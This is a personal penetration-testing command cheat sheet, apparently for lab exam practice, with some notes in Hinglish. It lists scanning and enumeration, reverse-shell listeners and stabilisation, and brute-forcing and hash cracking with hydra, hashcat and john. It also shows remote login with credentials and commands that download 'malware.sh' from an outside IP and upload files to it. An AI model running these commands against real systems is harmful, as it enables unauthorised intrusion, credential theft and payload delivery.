## Nmap

```
sudo nmap -sS -sV -O -p- --open -T4 -v target.com
```


Who's

```
whois megacorpone.com -h 192.168.50.251
```

Dns enumeration

```
dnsenum megacorpone.com
```

TCP/UDP scan

```
nc -nvv -w 1 -z 192.168.50.152 3388-3390
```


Feroxbuster

```
feroxbuster --smart --auto-tune -d 2 -u http://192.168.199.16 -C 403 -x php 

/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt

/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```


To stabilized the shell

```
python3 -c 'import pty; pty.spawn("/bin/bash")' 
CTRL + Z  >> isko prss krna hai 
stty -raw; fg
export TERM=xterm
```

For enumeration

```
sudo -l
```

Listener

```
nc -nvlp 4444 <<<listner>>>
```

To hide something in image

```
echo 'password hai amit' >> photo name.png
```

To read the message

```
strings photo name.png
```


Dirsearch

```
dirsearch -u http://example.com -w /path/to/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -e php,html,txt,json,js,xml,zip,backup,log -t 50 --recursive --random-agent --exclude-status=403,404 --plain-text-report=results.txt
```

File sharing

```
python3 -m http.server 80

http://localhost/ >> access
```

Best way 

```
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root


wget http://184.174.34.252:8080/malware.sh
  
curl -k filename.txt http://184.174.34.252:8080/
```

To download the file by hosting python3 -m http.server(defolt port 8000)

```
wget http://184.174.34.252:8000/malware.sh
```

To crack hash (john tool)

```
zip2john protected.zip > zip_hash.txt

john --wordlist=/usr/share/wordlists/rockyou.txt oracle.hash
```

hydra (to crack user/password)

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.0.100 -t 4
```

hydra for url

```
hydra -l user -P /usr/share/wordlists/rockyou.txt 192.168.50.201 http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
```

for doing bruteforce like hydra

```
nxc ssh 192.168.193.153 -u user.txt -p pass.txt --continue-on-success
```
chmod

```
chmod a+x script.sh(full perm)
chmod 600 id_rsa  (Secure private key file)
chmod 700 my_folder (Allow read-write-execute only to owner)
```

ssh

```
ssh username@host_or_ip -p 1234
ssh -i /path/to/private_key.pem kali@192.168.1.10(Using a private key)
```

ftp

```
ftp host_or_ip
```

hashcat(passworfd cracker)

```
hashcat --help | grep -i "KeePass"


hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
```

If 445 is open run
```
enum4linux
```

to unzip tar file 
```
tar -xvf
```

Responder cracking hash
```
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

universal command 
```
whoami && hostname && ipconfig && type proof.txt
```

```
xfreerdp /u:<username> /p:<password> /v:<Machine1_IP>

evil-winrm -i 192.168.50.220 -u daveadmin -p "qwertqwertqwert123\!\!"
```